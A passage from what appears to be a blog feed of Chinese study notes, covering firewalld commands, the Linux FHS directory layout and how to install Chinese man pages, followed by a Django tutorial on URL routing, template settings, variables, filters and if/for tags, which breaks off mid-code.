–reload</p><p>查看区域信息:  firewall-cmd –get-active-zones</p><p>查看指定接口所属区域： firewall-cmd –get-zone-of-interface&#x3D;eth0</p><p>拒绝所有包：firewall-cmd –panic-on</p><p>取消拒绝状态： firewall-cmd –panic-off</p><p>查看是否拒绝： firewall-cmd –query-panic</p><p>开启关闭防火墙以及其他操作<a href="https://www.cnblogs.com/Crazy-Liu/p/10837478.html">https://www.cnblogs.com/Crazy-Liu/p/10837478.html</a></p><h2 id="文件夹以及配置文件作用—–目录配置依据FHS"><a href="#文件夹以及配置文件作用—–目录配置依据FHS" class="headerlink" title="文件夹以及配置文件作用—–目录配置依据FHS"></a>文件夹以及配置文件作用—–目录配置依据FHS</h2><table><thead><tr><th></th><th>可分享</th><th>不可分享(与主机有关不适合分享)</th></tr></thead><tbody><tr><td>不变</td><td>&#x2F;usr(存放软件)</td><td>&#x2F;etc(配置文件)</td></tr><tr><td></td><td>&#x2F;opt(第三方辅助软件)</td><td>&#x2F;boot(启动与内核文件)</td></tr><tr><td>可变</td><td>&#x2F;var&#x2F;mail(用户邮箱)</td><td>&#x2F;var&#x2F;run(程序相关)</td></tr><tr><td></td><td>&#x2F;var&#x2F;spool&#x2F;news(新闻组)</td><td>&#x2F;var&#x2F;lock(程序相关)</td></tr></tbody></table><ul><li><strong>可分享</strong>：可以分享给其他系统挂载使用的目录，包括执行文件与用户的邮件等数据，能够分享给网络上其他主机挂载用的目录</li><li><strong>不可分享</strong>：自己机器上面运行的设备文件或是与程序有关的socket文件等，由于仅与自身机器有关，所以当然就不适合分享给其他主机</li><li><strong>不变</strong>：有些数据是不会经常变动的，跟随着发行版而不变动。例如函数库、文件说明、系统管理员所管理的主机服务配置文件</li><li><strong>可变动</strong>：经常修改的数据，例如日志文件、一般用户可自行接受的新闻组等</li></ul><blockquote><p>事实上FHS针对目录树架构仅定义出三层目录下面应该放置什么数据而已，分别是下面这三个目录的定义：</p></blockquote><ul><li>&#x2F;（root，根目录）：与启动系统有关</li><li>&#x2F;usr（unix software resource）：与软件安装&#x2F;执行有关</li><li>&#x2F;var（variable）：与系统运行过程有关<ul><li>&#x2F;lib<ul><li>&#x2F;rpm:用来记录各种安装的软件</li></ul></li></ul></li></ul><p>根目录（&#x2F;）的意义与内容</p><blockquote><p>所有的目录都是由根目录衍生出来，同时根目录与启动、还原、系统修复等操作有关<br>系统启动时需要特定的启动软件、内核文件、启动所需程序、函数库等文件数据<br>软系统出现错误是，根目录也必须包含能够修复文件系统的程序才行</p></blockquote><blockquote><p>FHS标准建议：根目录所在的分区应该越小越好，且应用程序所安装的软件最好不要与根目录放在同一个分区内，保持根目录越小越好。如此不但性能较佳，根目录所在的文件系统也较不容易发生问题。</p></blockquote><p>根目录下文件的作用<a href="https://www.cnblogs.com/jszd/p/11182190.html">https://www.cnblogs.com/jszd/p/11182190.html</a></p><ul><li>&#x2F;bin:(普通用户和管理员常用命令，存放在<strong>单人维护模式下还能够被使用的命令</strong>)</li><li>&#x2F;boot:(主要放置启动会用到的文件)</li><li>&#x2F;dev:(任何设备与接口都是以文件形式存放在这个目录)<ul><li>&#x2F;sd[a-p]:磁盘阵列</li><li>&#x2F;md[0-9]</li><li>&#x2F;shm通常是利用虚拟出来的磁盘通常占内存的一般物理内存,在里面建东西的速度是很快的</li></ul></li><li>&#x2F;usr:(存放系统软件资源，放置的数据属于可分享与不可变动)<ul><li>&#x2F;bin:所有一般用户能够使用的命令都放在这里。同时此目录下不应该有子目录<ul><li>&#x2F;cron:保存crontab -e(非root)的循环任务</li></ul></li><li>&#x2F;lib:与&#x2F;lib功能相同所以&#x2F;lib链接到此目录的<ul><li>&#x2F;systemd&#x2F;<ul><li>system&#x2F;:每个服务最主要的管理系统</li></ul></li></ul></li><li>&#x2F;local:root在本机安装自己下载的软件，建议安装到本目录，便于管理</li><li>&#x2F;sbin:非系统正常运行所需要的系统命令。目前&#x2F;sbin目录就链接到此目录中的</li><li>&#x2F;share:存放命令帮助文档和者软件帮助文档，几乎都是文本文件</li><li>&#x2F;games:与游戏相关的数据</li><li>&#x2F;include:c++等程序语言的头文件与包含文件放置处</li><li>&#x2F;libexec:某些不被一般用户常用的执行文件或脚本</li><li>&#x2F;src:一般源码放在这里</li></ul></li><li>&#x2F;etc:(系统配置文件几乎都在这个目录但只有root有权利修改,&#x3D;&#x3D;建议不要将可执行文件放在该目录里面&#x3D;&#x3D;)<ul><li>&#x2F;systemd<ul><li>&#x2F;system&#x2F;:管理员根据系统要求建立的脚本,优先级比&#x2F;run&#x2F;systemd&#x2F;system高</li></ul></li><li>&#x2F;passwd:存放各个用户的信息</li><li>&#x2F;shadow:存放个人密码</li><li>&#x2F;ld.so.conf:需要写入缓存的记录文件</li><li>&#x2F;crontab:系统循环任务</li><li>&#x2F;group:所有组个名在这里面</li><li>&#x2F;locale.conf:可以修改系统语言</li><li>&#x2F;opt（必要）:这个目录在防止第三方辅助软件&#x2F;opt的相关配置文件</li><li>&#x2F;filesystems:系统指定的测试挂载文件系统类型的优先级</li><li>&#x2F;shells:显示可以使用的shell</li><li>&#x2F;pam.d:用来保存PAM的所有认证配置文件</li><li>&#x2F;mdadm.conf</li><li>&#x2F;services:定义端口与服务的映射</li><li>&#x2F;yum.repos.d<ul><li>&#x2F;CentO S-Base.repo:yum配置文件</li></ul></li><li>&#x2F;profile.d<ul><li>&#x2F;*.sh:这里面所有的用户r权限的文件都会被&#x2F;etc&#x2F;profile调用,包含了操作界面的颜色、语系、别名等</li></ul></li><li>&#x2F;sysconfig<ul><li>&#x2F;network-scripts:网络配置目录</li></ul></li></ul></li><li>&#x2F;media: 存放<strong>可删除的设备</strong></li><li>&#x2F;mnt:暂时挂载某些额外的设备</li><li>&#x2F;var：系统运行后占用硬盘容量的目录<ul><li>&#x2F;cache:应用程序本身运行过程中产生的一些缓存<ul><li>&#x2F;yum:yum软件缓存</li></ul></li><li>&#x2F;lib:程序本身执行过程中，需要使用到的数据文件放置的目录。此目录下各自软件要有各自的目录<ul><li>&#x2F;xfsdump<ul><li>&#x2F;inventory:xfsdump的备份记录</li></ul></li></ul></li><li>&#x2F;lock：防止设备或文件同一时刻被多用户使用，使用时给该设备上锁，确保该设备只给单一软件使用（已经转移到&#x2F;run&#x2F;lock中）</li><li>&#x2F;run：程序或服务启动后，将PID放置到这个目录，与&#x2F;run相同，链接到&#x2F;run目录</li><li>&#x2F;mail：个人用户邮箱，也被放置到&#x2F;var&#x2F;spool&#x2F;mail目录，通常这两个目录互为链接文件</li><li>&#x2F;spool:放置队列数据。排队等待其他程序使用的数据，使用后会被删除<ul><li>&#x2F;cron: 计划任务数据</li></ul></li><li>&#x2F;spool<ul><li>&#x2F;news(新闻组)</li></ul></li><li>&#x2F;log：非常重要，日志文件放置的目录<ul><li>&#x2F;boot.log:记录系统检测与启动硬件信息</li><li>&#x2F;wtmp这个文件用来存放登录数据</li></ul></li></ul></li><li>&#x2F;run:系统启动后所产生的各项信息</li><li>&#x2F;tmp:一般用户或正在执行的程序暂时放置文件的地方。任何人都可以存取，建议在启动时将本目录下数据都清除</li><li>&#x2F;run或&#x2F;tmp数据接口文件常用来通过soocket来进行数据沟通<ul><li>&#x2F;run<ul><li>&#x2F;systemd<ul><li>&#x2F;system&#x2F;:系统执行过程中所产生的服务脚本,优先级比&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system高</li></ul></li></ul></li></ul></li><li>&#x2F;lib:(放置的是启动时会用到的库函数,以及在&#x2F;bin和&#x2F;sbin下面的命令会调用的库函数)<ul><li>&#x2F;modules:放置驱动程序(内核模块)<ul><li>$(uname -r)&#x2F;kernel&#x2F;fs<ul><li>例如ext4驱动就在&#x2F;lib&#x2F;modules&#x2F;$(uname -r)&#x2F;kernel&#x2F;fs&#x2F;ext4下</li></ul></li></ul></li></ul></li><li>&#x2F;opt:(给第三方辅助软件放置的目录，以前的linux系统中，习惯安装在&#x2F;usr&#x2F;local下)</li><li>&#x2F;sbin:(很多命令是用来设置系统环境的,这些命令只有root才能设置系统里面包含了修复启动还原系统所需要的命令)<ul><li>某些服务器软件程序放置在&#x2F;usr&#x2F;sbin中.本机自行安装的软件所产生中的系统执行文件,则放置到&#x2F;usr&#x2F;local&#x2F;sbin</li></ul></li><li>&#x2F;srv:(网络服务器运行后所需要使用的数据目录)</li><li>&#x2F;home:(普通用户的家目录,~回到这个目录下的指定文件)</li><li>&#x2F;root:(root用户的家目录，root的家目录和根目录放置在同一个分区中)</li><li>&#x2F;proc:(本身是虚拟文件系统，数据都放置在内存中。系统的信息例如内核、进程信息、外接设备、网络状况，他放置的数据都在内存中)<ul><li>&#x2F;proc&#x2F;mdstat:磁盘阵列数据</li><li>filesystems:Linux已经加载的文件系统类型</li><li>数字目录都是进程中的pid比如&#x2F;proc&#x2F;1就是对应进程中pid为1的进程,里面存放着相关进程的信息</li></ul></li><li>&#x2F;sys:不占硬盘容量也是保存系统信息的.</li></ul><h2 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h2><p>安装中文帮助手册</p><blockquote><p>yum install man-pages-zh-CN.noarch</p><p>echo “alias cman&#x3D;’man -M &#x2F;usr&#x2F;share&#x2F;man&#x2F;zh_CN’” &gt;&gt; ~&#x2F;.bashrc</p><p>source .bashrc</p></blockquote><p>重定向</p><h2 id="自己截图都找不到了，痛苦"><a href="#自己截图都找不到了，痛苦" class="headerlink" title="自己截图都找不到了，痛苦"></a>自己截图都找不到了，痛苦</h2>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>服务器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Django</title>
    <link href="/2022/01/09/Django/"/>
    <url>/2022/01/09/Django/</url>
    
    <content type="html"><![CDATA[<h1 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h1><blockquote><p>django-admin.py startproject HelloWorld</p></blockquote><p>创建Django项目</p><blockquote><p>python manage.py runserver 0.0.0.0:8000</p></blockquote><p>启动项目</p><h2 id="urls-py"><a href="#urls-py" class="headerlink" title="urls.py"></a>urls.py</h2><p>该 Django 项目的 URL 声明; 一份由 Django 驱动的网站”目录”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.conf.urls <span class="hljs-keyword">import</span> url<br> <br><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> views<br><span class="hljs-comment">#网页路径对应的函数解析</span><br>urlpatterns = [<br>    url(<span class="hljs-string">r&#x27;^$&#x27;</span>, views.hello),<br>]<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#在访问/hello时用views.hello来进行解析</span><br><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> path<br> <br><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> views<br> <br>urlpatterns = [<br>    path(<span class="hljs-string">&#x27;hello/&#x27;</span>, views.hello),<br>]<br></code></pre></td></tr></table></figure><hr><blockquote><p>对上文的path进行解释</p></blockquote><h3 id="path-函数"><a href="#path-函数" class="headerlink" title="path() 函数"></a>path() 函数</h3><p>Django path() 可以接收四个参数，分别是两个必选参数：route、view 和两个可选参数：kwargs、name。</p><p>语法格式：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">path(route, <span class="hljs-keyword">view</span>, kwargs=<span class="hljs-keyword">None</span>, <span class="hljs-type">name</span>=<span class="hljs-keyword">None</span>)<br></code></pre></td></tr></table></figure><ul><li>route: 字符串，表示 URL 规则，与之匹配的 URL 会执行对应的第二个参数 view。</li><li>view: 用于执行与正则表达式匹配的 URL 请求。</li><li>kwargs: 视图使用的字典类型的参数。</li><li>name: 用来反向获取 URL。</li></ul><p>Django2. 0中可以使用 re_path() 方法来兼容 1.x 版本中的 <strong>url()</strong> 方法，一些正则表达式的规则也可以通过 re_path() 来实现 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> include, re_path<br><br>urlpatterns = [<br>    re_path(<span class="hljs-string">r&#x27;^index/$&#x27;</span>, views.index, name=<span class="hljs-string">&#x27;index&#x27;</span>),<br>    re_path(<span class="hljs-string">r&#x27;^bio/(?P&lt;username&gt;\w+)/$&#x27;</span>, views.bio, name=<span class="hljs-string">&#x27;bio&#x27;</span>),<br>    re_path(<span class="hljs-string">r&#x27;^weblog/&#x27;</span>, include(<span class="hljs-string">&#x27;blog.urls&#x27;</span>)),<br>    ...<br>]<br></code></pre></td></tr></table></figure><h2 id="templates"><a href="#templates" class="headerlink" title="templates"></a>templates</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">HelloWorld/<br>|<span class="hljs-string">-- HelloWorld</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- __init__.py</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- __init__.pyc</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- settings.py</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- settings.pyc</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- urls.py</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- urls.pyc</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- views.py</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- views.pyc</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- wsgi.py</span><br><span class="hljs-string"></span>|<span class="hljs-string">   `-- wsgi.pyc</span><br><span class="hljs-string"></span>|<span class="hljs-string">-- manage.py</span><br><span class="hljs-string">`-- templates</span><br><span class="hljs-string">    `-- runoob.html</span><br></code></pre></td></tr></table></figure><p>假设新建template文件夹后dir是这样的</p><p>然后在setting.py中设置为’DIRS’: [BASE_DIR+”&#x2F;templates”,],</p><p>在setting文件加中我们可以看到&#x3D;&#x3D;BASE_DIR &#x3D; Path(<strong>file</strong>).resolve().parent.parent&#x3D;&#x3D;这样的设置</p><p>首先新建一个runoob.html然后输入代码如下:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;&#123; hello &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="模板用法"><a href="#模板用法" class="headerlink" title="模板用法"></a>模板用法</h2><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cos">Django 模板标签<br>变量<br>模板语法：<br><br><span class="hljs-keyword">view</span>：｛<span class="hljs-string">&quot;HTML变量名&quot;</span> : <span class="hljs-string">&quot;views变量名&quot;</span>｝<br>HTML：｛｛变量名｝｝<br></code></pre></td></tr></table></figure><p>如果要新建一个&#x3D;&#x3D;templates&#x3D;&#x3D;文件夹用来存储静态html然后修改&#x3D;&#x3D;setting.py&#x3D;&#x3D;中的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">TEMPLATES = [<br>    &#123;<br>        <span class="hljs-string">&#x27;BACKEND&#x27;</span>: <span class="hljs-string">&#x27;django.template.backends.django.DjangoTemplates&#x27;</span>,<br>        <span class="hljs-string">&#x27;DIRS&#x27;</span>: [BASE_DIR, <span class="hljs-string">&quot;/templates&quot;</span>,],       <span class="hljs-comment"># 修改位置</span><br>        <span class="hljs-string">&#x27;APP_DIRS&#x27;</span>: <span class="hljs-literal">True</span>,<br>        <span class="hljs-string">&#x27;OPTIONS&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;context_processors&#x27;</span>: [<br>                <span class="hljs-string">&#x27;django.template.context_processors.debug&#x27;</span>,<br>                <span class="hljs-string">&#x27;django.template.context_processors.request&#x27;</span>,<br>                <span class="hljs-string">&#x27;django.contrib.auth.context_processors.auth&#x27;</span>,<br>                <span class="hljs-string">&#x27;django.contrib.messages.context_processors.messages&#x27;</span>,<br>            ],<br>        &#125;,<br>    &#125;,<br>]<br></code></pre></td></tr></table></figure><p>如果在静态文件中定义有要修改的变量,如下:修改&#x3D;&#x3D;hello&#x3D;&#x3D;变量</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;&#123; hello &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><p>修改views.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">runoob</span>(<span class="hljs-params">request</span>):<br>    context          = &#123;&#125;<br>    context[<span class="hljs-string">&#x27;hello&#x27;</span>] = <span class="hljs-string">&#x27;Hello World!&#x27;</span><br>    <span class="hljs-keyword">return</span> render(request, <span class="hljs-string">&#x27;runoob.html&#x27;</span>, context)<br></code></pre></td></tr></table></figure><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>html中的文件内容</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">name</span> &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>对应view.py中的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">runoob</span>(<span class="hljs-params">request</span>):<br>  views_name = <span class="hljs-string">&quot;菜鸟教程&quot;</span><br>  <span class="hljs-keyword">return</span>  render(request,<span class="hljs-string">&quot;runoob.html&quot;</span>, &#123;<span class="hljs-string">&quot;name&quot;</span>:views_name&#125;)<br></code></pre></td></tr></table></figure><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>html中的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123; views_list &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>   # 取出整个列表<br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123; views_list.0 &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> # 取出列表的第一个元素<br></code></pre></td></tr></table></figure><p>对应view.py中的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">runoob</span>(<span class="hljs-params">request</span>):<br>    views_list = [<span class="hljs-string">&quot;菜鸟教程1&quot;</span>,<span class="hljs-string">&quot;菜鸟教程2&quot;</span>,<span class="hljs-string">&quot;菜鸟教程3&quot;</span>]<br>    <span class="hljs-keyword">return</span> render(request, <span class="hljs-string">&quot;runoob.html&quot;</span>, &#123;<span class="hljs-string">&quot;views_list&quot;</span>: views_list&#125;)<br></code></pre></td></tr></table></figure><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><p>html中的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123; views_dict &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123; views_dict.name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>对应view.py中的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">runoob</span>(<span class="hljs-params">request</span>):<br>    views_dict = &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;菜鸟教程&quot;</span>&#125;<br>    <span class="hljs-keyword">return</span> render(request, <span class="hljs-string">&quot;runoob.html&quot;</span>, &#123;<span class="hljs-string">&quot;views_dict&quot;</span>: views_dict&#125;)<br></code></pre></td></tr></table></figure><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>html中的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;&#123; 变量名 | 过滤器：可选参数 &#125;&#125;<br></code></pre></td></tr></table></figure><p>可以将过滤器的结果用来作为下一个过滤器输入:</p><p>过滤器后面可以接参数用:””来输入</p><p>default有false(0  0.0  False  0j  “”  []  ()  set()  {}  None都是false)</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">my_list</span>|first(<span class="hljs-name">取出第一个元素</span>)</span><br><span class="hljs-template-variable">|upper(<span class="hljs-name">转换为大写</span>)</span><br><span class="hljs-template-variable">|truncatewords:<span class="hljs-string">&quot;参数&quot;</span></span><br><span class="hljs-template-variable">|default(<span class="hljs-name">设置默认值</span>):<span class="hljs-string">&quot;参数&quot;</span></span><br><span class="hljs-template-variable">|length(<span class="hljs-name">返回对象的长度，适用于字符串和列表。</span>)</span><br><span class="hljs-template-variable">|filesizeformat(<span class="hljs-name">以更易读的方式显示文件的大小</span>(<span class="hljs-name">即</span><span class="hljs-string">&#x27;13 KB&#x27;</span>, <span class="hljs-string">&#x27;4.1 MB&#x27;</span>, <span class="hljs-string">&#x27;102 bytes&#x27;</span>等)</span><br><span class="hljs-template-variable">|date(<span class="hljs-name">根据给定格式对一个日期变量进行格式化</span>):如<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>&#125;&#125;</span><br><span class="hljs-template-variable">|truncatechars(<span class="hljs-name">如果字符串包含的字符总个数多于指定的字符数量，那么会被截断掉后面的部分</span>):<span class="hljs-string">&quot;长度&quot;</span></span><br><span class="hljs-template-variable">&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>对应view.py中的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">runoob</span>(<span class="hljs-params">request</span>):<br>    views_dict = &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;菜鸟教程&quot;</span>&#125;<br>    <span class="hljs-keyword">return</span> render(request, <span class="hljs-string">&quot;runoob.html&quot;</span>, &#123;<span class="hljs-string">&quot;views_dict&quot;</span>: views_dict&#125;)<br></code></pre></td></tr></table></figure><h3 id="if-x2F-else"><a href="#if-x2F-else" class="headerlink" title="if&#x2F;else"></a>if&#x2F;else</h3><p>html代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;% if condition1 %&#125;<br>   ... display 1<br>&#123;% elif condition2 %&#125;<br>   ... display 2<br>&#123;% else %&#125;<br>   ... display 3<br>&#123;% endif %&#125;<br></code></pre></td></tr></table></figure><p>例如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;%if num &gt; 90 and num &lt;= 100 %&#125;<br>优秀<br>&#123;% elif num &gt; 60 and num &lt;= 90 %&#125;<br>合格<br>&#123;% else %&#125;<br>一边玩去～<br>&#123;% endif %&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">runoob</span>(<span class="hljs-params">request</span>):<br>    views_num = <span class="hljs-number">88</span><br>    <span class="hljs-keyword">return</span> render(request, <span class="hljs-string">&quot;runoob.html&quot;</span>, &#123;<span class="hljs-string">&quot;num&quot;</span>: views_num&#125;)<br></code></pre></td></tr></table></figure><h3 id="for标签"><a href="#for标签" class="headerlink" title="for标签"></a>for标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>&#123;% for athlete in athlete_list %&#125;<br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>&#123;&#123; athlete.name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>&#123;% endfor %&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><p>例如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;% for i in views_list %&#125;<br>&#123;&#123; i &#125;&#125;<br>&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">runoob</span>(<span class="hljs-params">request</span>):<br>    views_list = [<span class="hljs-string">&quot;菜鸟教程&quot;</span>,<span class="hljs-string">&quot;菜鸟教程1&quot;</span>,<span class="hljs-string">&quot;菜鸟教程2&quot;</span>,<span class="hljs-string">&quot;菜鸟教程3&quot;</span>,]<br>    <span class="hljs-keyword">return</span> render(request, <span class="hljs-string">&quot;runoob.html&quot;</span>, &#123;<span class="hljs-string">&quot;views_list&quot;</span>: 